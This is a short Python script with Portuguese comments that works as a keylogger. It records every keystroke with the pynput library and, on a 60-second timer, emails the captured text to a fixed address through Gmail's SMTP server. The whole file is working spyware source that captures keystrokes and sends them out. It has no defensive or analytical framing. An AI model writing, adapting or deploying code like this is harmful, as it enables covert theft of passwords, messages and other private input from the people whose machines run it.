from pynput import keyboard # biblioteca para monitorar inputs do sistema
import smtplib # biblioteca para enviar emails
from email.mime.text import MIMEText # formata o conteudo em mensagem de texto
from threading import Timer # permite setar timers

log = ""

# CONFIGURAÇÕES DE E-MAIL
email_origem = "keylogger@gmail.com"
email_destino = "keylogger@gmail.com"
senha_email = "[CHAVE DE ACESSO DA CONTA GOOGLE]"

def enviar_email():
    global log
    if log:
        msg = MIMEText(log)
        msg['SUBJECT'] = "Dados capturados pelo keylogger"
        msg['From'] = email_origem
        msg['To'] = email_destino
        try:
            server = smtplib.SMTP("smtp.gmail.com", 587) # servidor de email do google
            server.starttls()
            server.login(email_origem, senha_email)
            server.send_message(msg)
            server.quit()
        except Exception as e:
            print("ERRO ao enviar", e)

        log = ""

    # Agendar o envio de email a cada 60 segundos
    Timer(60, enviar_email).start() 

def on_press(key):
    global log
    try:
        log+= key.char
    except AttributeError:
            if key == keyboard.Key.space:
                log += " "
            elif key == keyboard.Key.enter:
                log += "\n"
            elif key == keyboard.Key.backspace:
                log += "[<]"
            else:
                pass # ignorar crtl, shift, etc...

# Iniciar o Keylogger e o envio automático

with keyboard.Listener(on_press=on_press) as listener:
    enviar_email()
    listener.join()
